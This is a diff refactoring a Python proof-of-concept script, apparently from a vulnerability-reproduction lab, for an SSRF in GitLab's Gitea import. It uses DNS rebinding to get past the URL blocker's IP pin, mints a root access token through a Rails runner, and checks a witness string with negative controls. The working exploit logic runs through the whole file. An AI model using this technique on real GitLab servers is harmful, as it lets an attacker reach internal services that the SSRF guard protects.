@@ -226,33 +226,124 @@ _builtins.print = _cprint
 
 """GitLab CE 19.4.1 Gitea HTTPS import drops UrlBlocker IP pin."""
 
-
 import json
 import os
 import re
 import subprocess
-import sys
 import time
 import urllib.error
 import urllib.parse
 import urllib.request
+from dataclasses import dataclass
+from pathlib import Path
+from typing import Literal, NoReturn
 
 WITNESS = "GITLAB-GITEA-IMPORT-SSRF-WITNESS"
 LABEL = "GITLAB-GITEA-IMPORT-SSRF"
-GITLAB = os.environ.get("GITLAB_URL", "http://127.0.0.1:18400").rstrip("/")
-COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "gitlab-gitea-import-ssrf")
-DNS_CONTROL = os.environ.get("DNS_CONTROL", "http://127.0.0.1:18453").rstrip("/")
-READY_TIMEOUT = int(os.environ.get("GITLAB_READY_TIMEOUT", "1200"))
-ROOT_PASSWORD = os.environ.get("GITLAB_ROOT_PASSWORD", "CveL4b!Xk92#Qm")
 LAB_PASSWORD = "L4bUs3r!Qm92#x"
 GITEA_HTTPS = "https://gitea.lab/"
 GITEA_HTTP = "http://gitea.lab/"
 DIRECT_LOOPBACK = "https://127.0.0.1/"
-HERE = os.path.dirname(os.path.abspath(__file__))
+USER_AGENT = "cve-lab-gitea-import/1.0"
+PATH_SIGN_IN = "/users/sign_in"
+PATH_USERS = "/api/v4/users"
+PATH_APP_SETTINGS = "/api/v4/application/settings"
+PATH_GITEA_NEW = "/import/gitea/new"
+PATH_GITEA_TOKEN = "/import/gitea/personal_access_token"
+PATH_GITEA_STATUS = "/import/gitea/status.json"
+DNS_MODE_PAIRS: Literal["pairs"] = "pairs"
+DNS_MODE_FIRST2: Literal["first2_then_loopback"] = "first2_then_loopback"
+IMPORT_SOURCES = [
+    "github",
+    "bitbucket",
+    "bitbucket_server",
+    "fogbugz",
+    "git",
+    "gitlab_project",
+    "gitea",
+    "manifest",
+]
+CSRF_PATTERNS = (
+    r'name="authenticity_token"\s+value="([^"]+)"',
+    r'value="([^"]+)"\s+name="authenticity_token"',
+    r'name="csrf-token"\s+content="([^"]+)"',
+    r'content="([^"]+)"\s+name="csrf-token"',
+    r'"csrf-token"\s+content="([^"]+)"',
+    r'<meta name="csrf-token" content="([^"]+)"',
+)
+BLOCKED_NEEDLES = (
+    "specified url cannot be used",
+    "cannot be used",
+    "requests to localhost",
+    "requests to loopback",
+    "blocked url",
+    "url is blocked",
+    "not allowed",
+)
+RAILS_LOG_GREP = (
+    "grep -E 'BlockedUrl|Octokit|Faraday|SSL|certificate|ConnectionFailed|Error|Exception' "
+    "/var/log/gitlab/gitlab-rails/production.log 2>/dev/null | tail -n 40; echo '---'; "
+    "tail -n 40 /var/log/gitlab/gitlab-rails/production.log 2>/dev/null || true"
+)
+MINT_RUBY = r"""
+s = ApplicationSetting.current
+sources = Array(s.import_sources)
+wanted = %w[gitea github git gitlab_project bitbucket bitbucket_server fogbugz manifest]
+s.update!(import_sources: (sources | wanted)) unless (wanted - sources).empty?
+root = User.find_by_username('root')
+raise 'no root user' unless root
+root.personal_access_tokens.where(name: 'cve-lab-gitea-import').find_each(&:revoke!)
+pat = root.personal_access_tokens.create!(
+  name: 'cve-lab-gitea-import',
+  scopes: [:api],
+  expires_at: 364.days.from_now
+)
+puts "PAT=#{pat.token}"
+puts "IMPORT=#{Array(ApplicationSetting.current.import_sources).include?('gitea')}"
+puts "LOCAL=#{Gitlab::CurrentSettings.allow_local_requests_from_web_hooks_and_services?}"
+"""
+
+
+@dataclass(frozen=True)
+class LabConfig:
+    gitlab: str
+    compose_project: str
+    dns_control: str
+    ready_timeout: int
+    root_password: str
+    here: Path
+
+    @classmethod
+    def from_env(cls) -> LabConfig:
+        return cls(
+            gitlab=os.environ.get("GITLAB_URL", "http://127.0.0.1:18400").rstrip("/"),
+            compose_project=os.environ.get("COMPOSE_PROJECT_NAME", "gitlab-gitea-import-ssrf"),
+            dns_control=os.environ.get("DNS_CONTROL", "http://127.0.0.1:18453").rstrip("/"),
+            ready_timeout=int(os.environ.get("GITLAB_READY_TIMEOUT", "1200")),
+            root_password=os.environ.get("GITLAB_ROOT_PASSWORD", "CveL4b!Xk92#Qm"),
+            here=Path(__file__).resolve().parent,
+        )
+
+
+CFG = LabConfig.from_env()
+GITLAB = CFG.gitlab
+COMPOSE_PROJECT = CFG.compose_project
+DNS_CONTROL = CFG.dns_control
+READY_TIMEOUT = CFG.ready_timeout
+ROOT_PASSWORD = CFG.root_password
+HERE = CFG.here
 
 
 class NoRedirect(urllib.request.HTTPRedirectHandler):
-    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ANN001
+    def redirect_request(
+        self,
+        req: urllib.request.Request,
+        fp: object,
+        code: int,
+        msg: str,
+        headers: object,
+        newurl: str,
+    ) -> None:
         return None
 
 
@@ -260,12 +351,12 @@ def log(msg: str) -> None:
     print(msg, flush=True)
 
 
-def fail(reason: str) -> None:
+def fail(reason: str) -> NoReturn:
     log(f"FAIL {LABEL} {reason}")
     raise SystemExit(1)
 
 
-def success(detail: str) -> None:
+def success(detail: str) -> NoReturn:
     log(f"SUCCESS {LABEL} {detail} {WITNESS}")
     raise SystemExit(0)
 
@@ -281,15 +372,7 @@ def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
 
 
 def csrf_token(html: str) -> str:
-    patterns = (
-        r'name="authenticity_token"\s+value="([^"]+)"',
-        r'value="([^"]+)"\s+name="authenticity_token"',
-        r'name="csrf-token"\s+content="([^"]+)"',
-        r'content="([^"]+)"\s+name="csrf-token"',
-        r'"csrf-token"\s+content="([^"]+)"',
-        r'<meta name="csrf-token" content="([^"]+)"',
-    )
-    for pat in patterns:
+    for pat in CSRF_PATTERNS:
         match = re.search(pat, html, re.I)
         if match:
             return match.group(1)
@@ -313,7 +396,7 @@ class Browser:
     ) -> tuple[int, str, dict[str, str]]:
         hdrs = {
             "Accept": "text/html,application/json;q=0.9,*/*;q=0.8",
-            "User-Agent": "cve-lab-gitea-import/1.0",
+            "User-Agent": USER_AGENT,
         }
         if headers:
             hdrs.update(headers)
@@ -326,7 +409,7 @@ class Browser:
         except urllib.error.HTTPError as exc:
             try:
                 self.cookies.cookiejar.extract_cookies(exc, req)
-            except Exception:
+            except (AttributeError, OSError, ValueError):
                 pass
             body = exc.read().decode("utf-8", "replace")
             return exc.code, body, dict(exc.headers.items()) if exc.headers else {}
@@ -338,7 +421,7 @@ def http_json(
     method: str,
     path: str,
     token: str | None = None,
-    payload: dict | None = None,
+    payload: dict[str, object] | None = None,
     timeout: int = 60,
 ) -> tuple[int, str]:
     url = path if path.startswith("http") else f"{GITLAB}{path}"
@@ -359,17 +442,19 @@ def http_json(
         return 0, str(exc.reason)
 
 
-def dns_api(method: str, path: str, timeout: int = 8) -> tuple[int, dict]:
+def dns_api(method: str, path: str, timeout: int = 8) -> tuple[int, dict[str, object]]:
     url = f"{DNS_CONTROL}{path}"
     req = urllib.request.Request(url, data=b"" if method == "POST" else None, method=method)
     try:
         with urllib.request.urlopen(req, timeout=timeout) as resp:
             raw = resp.read().decode("utf-8", "replace")
-            return resp.getcode(), json.loads(raw) if raw else {}
+            parsed: dict[str, object] = json.loads(raw) if raw else {}
+            return resp.getcode(), parsed
     except urllib.error.HTTPError as exc:
         raw = exc.read().decode("utf-8", "replace")
         try:
-            return exc.code, json.loads(raw) if raw else {}
+            parsed_err: dict[str, object] = json.loads(raw) if raw else {}
+            return exc.code, parsed_err
         except json.JSONDecodeError:
             return exc.code, {"raw": raw}
     except (urllib.error.URLError, json.JSONDecodeError) as exc:
@@ -389,12 +474,14 @@ def dns_reset(mode: str | None = None) -> None:
         fail(f"dns control reset failed {status} {body}")
 
 
-def dns_stats() -> dict:
+def dns_stats() -> dict[str, object]:
     status, body = dns_api("GET", "/stats")
     log(f"dns-stats status={status} lookups={body.get('a_lookups')} mode={body.get('mode')}")
     events = body.get("events") or []
-    for ev in events[-12:]:
-        log(f"dns-event n={ev.get('n')} name={ev.get('name')} ip={ev.get('ip')}")
+    if isinstance(events, list):
+        for ev in events[-12:]:
+            if isinstance(ev, dict):
+                log(f"dns-event n={ev.get('n')} name={ev.get('name')} ip={ev.get('ip')}")
     return body
 
 
@@ -403,9 +490,10 @@ def wait_ready() -> None:
     last = "none"
     browser = Browser()
     while time.time() < deadline:
-        status, body, _hdrs = browser.request("GET", f"{GITLAB}/users/sign_in", timeout=10)
+        status, body, _hdrs = browser.request("GET", f"{GITLAB}{PATH_SIGN_IN}", timeout=10)
         last = f"{status} {body[:80]!r}"
-        if status == 200 and ("sign_in" in body.lower() or "password" in body.lower() or "gitlab" in body.lower()):
+        low = body.lower()
+        if status == 200 and ("sign_in" in low or "password" in low or "gitlab" in low):
             log(f"gitlab-ready {last}")
             return
         log(f"gitlab-wait {last}")
@@ -414,27 +502,10 @@ def wait_ready() -> None:
 
 
 def mint_and_enable() -> str:
-    ruby = r"""
-s = ApplicationSetting.current
-sources = Array(s.import_sources)
-wanted = %w[gitea github git gitlab_project bitbucket bitbucket_server fogbugz manifest]
-s.update!(import_sources: (sources | wanted)) unless (wanted - sources).empty?
-root = User.find_by_username('root')
-raise 'no root user' unless root
-root.personal_access_tokens.where(name: 'cve-lab-gitea-import').find_each(&:revoke!)
-pat = root.personal_access_tokens.create!(
-  name: 'cve-lab-gitea-import',
-  scopes: [:api],
-  expires_at: 364.days.from_now
-)
-puts "PAT=#{pat.token}"
-puts "IMPORT=#{Array(ApplicationSetting.current.import_sources).include?('gitea')}"
-puts "LOCAL=#{Gitlab::CurrentSettings.allow_local_requests_from_web_hooks_and_services?}"
-"""
     last = ""
     for attempt in range(1, 9):
         log(f"mint-pat gitlab-rails runner attempt={attempt}")
-        proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", ruby, timeout=300)
+        proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", MINT_RUBY, timeout=300)
         out = (proc.stdout or "") + (proc.stderr or "")
         last = f"rc={proc.returncode} out={out[-2000:]}"
         log(f"mint-pat {last[:400]}")
@@ -452,7 +523,7 @@ puts "LOCAL=#{Gitlab::CurrentSettings.allow_local_requests_from_web_hooks_and_se
 
 
 def ensure_labuser(token: str) -> str:
-    status, body = http_json("GET", "/api/v4/users?username=labuser", token)
+    status, body = http_json("GET", f"{PATH_USERS}?username=labuser", token)
     if status == 200:
         try:
             rows = json.loads(body)
@@ -463,7 +534,7 @@ def ensure_labuser(token: str) -> str:
             pass
     status, body = http_json(
         "POST",
-        "/api/v4/users",
+        PATH_USERS,
         token,
         {
             "email": "lab@localhost.invalid",
@@ -474,14 +545,14 @@ def ensure_labuser(token: str) -> str:
         },
     )
     log(f"labuser-create status={status} body={body[:240]!r}")
-    if status in (200, 201) or (status == 409) or "already been taken" in body.lower():
+    if status in (200, 201) or status == 409 or "already been taken" in body.lower():
         return "labuser"
     log("labuser-create failed; using root")
     return "root"
 
 
 def login(browser: Browser, username: str, password: str) -> None:
-    status, body, _hdrs = browser.request("GET", f"{GITLAB}/users/sign_in", timeout=30)
+    status, body, _hdrs = browser.request("GET", f"{GITLAB}{PATH_SIGN_IN}", timeout=30)
     if status != 200:
         fail(f"sign_in page {status} {body[:200]}")
     token = csrf_token(body)
@@ -497,25 +568,30 @@ def login(browser: Browser, username: str, password: str) -> None:
     ).encode("utf-8")
     status, body, hdrs = browser.request(
         "POST",
-        f"{GITLAB}/users/sign_in",
+        f"{GITLAB}{PATH_SIGN_IN}",
         data=payload,
         headers={
             "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": f"{GITLAB}/users/sign_in",
+            "Referer": f"{GITLAB}{PATH_SIGN_IN}",
             "Origin": GITLAB,
         },
         timeout=30,
         follow=True,
     )
     loc = hdrs.get("Location") or hdrs.get("location") or ""
-    log(f"login user={username} status={status} location={loc[:120]} cookies={len(list(browser.cookies.cookiejar))}")
+    n_cookies = len(list(browser.cookies.cookiejar))
+    log(f"login user={username} status={status} location={loc[:120]} cookies={n_cookies}")
     if status in (302, 303, 301) and "sign_in" in loc:
         fail(f"login redirected back to sign_in {loc}")
-    if status == 200 and ("Invalid login" in body or ("invalid" in body.lower() and "password" in body.lower() and "sign_in" in body.lower())):
+    low = body.lower()
+    if status == 200 and (
+        "Invalid login" in body or ("invalid" in low and "password" in low and "sign_in" in low)
+    ):
         fail("login rejected")
     home_status, home, _hdrs = browser.request("GET", f"{GITLAB}/", timeout=30, follow=True)
     blob = home.lower()
-    if "sign_in" in blob and "sign-out" not in blob and "sign_out" not in blob and username.lower() not in blob:
+    signed_out = "sign-out" not in blob and "sign_out" not in blob
+    if "sign_in" in blob and signed_out and username.lower() not in blob:
         fail(f"login session missing status={home_status} {home[:180]}")
     log(f"login-session ok user={username} home={home_status}")
 
@@ -523,20 +599,9 @@ def login(browser: Browser, username: str, password: str) -> None:
 def enable_gitea_import(token: str) -> None:
     status, body = http_json(
         "PUT",
-        "/api/v4/application/settings",
+        PATH_APP_SETTINGS,
         token,
-        {
-            "import_sources": [
-                "github",
-                "bitbucket",
-                "bitbucket_server",
-                "fogbugz",
-                "git",
-                "gitlab_project",
-                "gitea",
-                "manifest",
-            ]
-        },
+        {"import_sources": list(IMPORT_SOURCES)},
     )
     log(f"enable-gitea-import status={status} body={body[:180]!r}")
     if status not in (200, 201):
@@ -544,7 +609,9 @@ def enable_gitea_import(token: str) -> None:
 
 
 def post_gitea_token(browser: Browser, host_url: str) -> tuple[int, str, dict[str, str]]:
-    status, body, _hdrs = browser.request("GET", f"{GITLAB}/import/gitea/new", timeout=30, follow=True)
+    status, body, _hdrs = browser.request(
+        "GET", f"{GITLAB}{PATH_GITEA_NEW}", timeout=30, follow=True
+    )
     log(f"gitea-new status={status} bytes={len(body)}")
     if status == 404:
         fail(f"gitea import 404 body={body[:300]!r}")
@@ -560,24 +627,26 @@ def post_gitea_token(browser: Browser, host_url: str) -> tuple[int, str, dict[st
     ).encode("utf-8")
     status, body, hdrs = browser.request(
         "POST",
-        f"{GITLAB}/import/gitea/personal_access_token",
+        f"{GITLAB}{PATH_GITEA_TOKEN}",
         data=payload,
         headers={
             "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": f"{GITLAB}/import/gitea/new",
+            "Referer": f"{GITLAB}{PATH_GITEA_NEW}",
             "Origin": GITLAB,
         },
         timeout=30,
     )
     loc = hdrs.get("Location") or hdrs.get("location") or ""
-    log(f"gitea-token host={host_url} status={status} location={loc[:160]} body={body[:180]!r}")
+    log(
+        f"gitea-token host={host_url} status={status} location={loc[:160]} body={body[:180]!r}"
+    )
     return status, body, hdrs
 
 
 def get_status_json(browser: Browser, timeout: int = 90) -> tuple[int, str, dict[str, str]]:
     status, body, hdrs = browser.request(
         "GET",
-        f"{GITLAB}/import/gitea/status.json",
+        f"{GITLAB}{PATH_GITEA_STATUS}",
         headers={"Accept": "application/json"},
         timeout=timeout,
     )
@@ -596,16 +665,7 @@ def blocked_text(status: int, body: str, hdrs: dict[str, str] | None = None) -> 
     if hdrs:
         loc = hdrs.get("Location") or hdrs.get("location") or ""
     blob = f"{status} {body} {loc}".lower()
-    needles = (
-        "specified url cannot be used",
-        "cannot be used",
-        "requests to localhost",
-        "requests to loopback",
-        "blocked url",
-        "url is blocked",
-        "not allowed",
-    )
-    if any(n in blob for n in needles):
+    if any(n in blob for n in BLOCKED_NEEDLES):
         return True
     return status in (422, 400) and "url" in blob
 
@@ -625,15 +685,7 @@ def ssl_fail_reason(body: str, logs: str) -> str | None:
 
 
 def dump_production_log() -> str:
-    proc = compose(
-        "exec",
-        "-T",
-        "gitlab",
-        "bash",
-        "-lc",
-        "grep -E 'BlockedUrl|Octokit|Faraday|SSL|certificate|ConnectionFailed|Error|Exception' /var/log/gitlab/gitlab-rails/production.log 2>/dev/null | tail -n 40; echo '---'; tail -n 40 /var/log/gitlab/gitlab-rails/production.log 2>/dev/null || true",
-        timeout=40,
-    )
+    proc = compose("exec", "-T", "gitlab", "bash", "-lc", RAILS_LOG_GREP, timeout=40)
     text = ((proc.stdout or "") + (proc.stderr or ""))[-2500:]
     log("rails-log " + text)
     return text
@@ -654,11 +706,30 @@ def run_positive(browser: Browser, mode: str) -> tuple[bool, str]:
     if blocked_text(status, body, hdrs):
         return False, f"status.json blocked mode={mode} {status} {body[:180]}"
     if WITNESS in logs:
-        return False, f"catcher saw GET but status.json missing witness mode={mode} {status} {body[:180]}"
+        return False, (
+            f"catcher saw GET but status.json missing witness mode={mode} {status} {body[:180]}"
+        )
     return False, f"no witness mode={mode} {status} {body[:180]}"
 
 
-def main() -> None:
+def _dns_all_public(stats: dict[str, object]) -> bool:
+    events = stats.get("events") or []
+    if not isinstance(events, list):
+        return False
+    lookups = stats.get("a_lookups", 0)
+    if not isinstance(lookups, int) or lookups <= 2:
+        return False
+    for ev in events:
+        if not isinstance(ev, dict):
+            continue
+        if ev.get("name") in ("reset", ""):
+            continue
+        if ev.get("ip") != "1.1.1.1":
+            return False
+    return True
+
+
+def main() -> int:
     log(f"lab {LABEL} gitlab={GITLAB}")
     wait_ready()
     token = mint_and_enable()
@@ -670,7 +741,7 @@ def main() -> None:
     else:
         login(browser, "root", ROOT_PASSWORD)
 
-    dns_reset("first2_then_loopback")
+    dns_reset(DNS_MODE_FIRST2)
     post_gitea_token(browser, DIRECT_LOOPBACK)
     neg_status, neg_body, neg_hdrs = get_status_json(browser, timeout=30)
     if WITNESS in neg_body:
@@ -679,37 +750,36 @@ def main() -> None:
         fail(f"NEGATIVE A https://127.0.0.1 expected blocked got {neg_status} {neg_body[:200]}")
     log("negative-a https://127.0.0.1 blocked")
 
-    ok, detail = run_positive(browser, "pairs")
+    ok, detail = run_positive(browser, DNS_MODE_PAIRS)
     if not ok and "SSL verify" in detail:
         fail(detail)
     if not ok:
         log(f"positive pairs missed ({detail}); retry first2_then_loopback")
-        ok, detail = run_positive(browser, "first2_then_loopback")
+        ok, detail = run_positive(browser, DNS_MODE_FIRST2)
         if not ok and "SSL verify" in detail:
             fail(detail)
         if not ok:
             stats = dns_stats()
-            if stats.get("a_lookups", 0) > 2 and all(
-                ev.get("ip") == "1.1.1.1" for ev in (stats.get("events") or []) if ev.get("name") not in ("reset", "")
-            ):
+            if _dns_all_public(stats):
                 fail("DNS cache makes every lookup 1.1.1.1")
             fail(detail)
 
-    dns_reset("first2_then_loopback")
+    dns_reset(DNS_MODE_FIRST2)
     post_gitea_token(browser, GITEA_HTTP)
     http_status, http_body, http_hdrs = get_status_json(browser, timeout=45)
     dns_stats()
     if WITNESS in http_body:
         fail("NEGATIVE B HTTP gitea.lab returned witness (pin was dropped for HTTP too)")
-    log(f"negative-b http://gitea.lab no-witness status={http_status} blocked={blocked_text(http_status, http_body, http_hdrs)}")
+    blocked = blocked_text(http_status, http_body, http_hdrs)
+    log(f"negative-b http://gitea.lab no-witness status={http_status} blocked={blocked}")
     success(detail)
 
 
 if __name__ == "__main__":
     try:
-        main()
+        raise SystemExit(main())
     except SystemExit:
         raise
-    except Exception as exc:  # noqa: BLE001 — last-line FAIL contract
+    except Exception as exc:  # noqa: BLE001 - last-line FAIL contract
         fail(f"exception {type(exc).__name__}: {exc}")
 
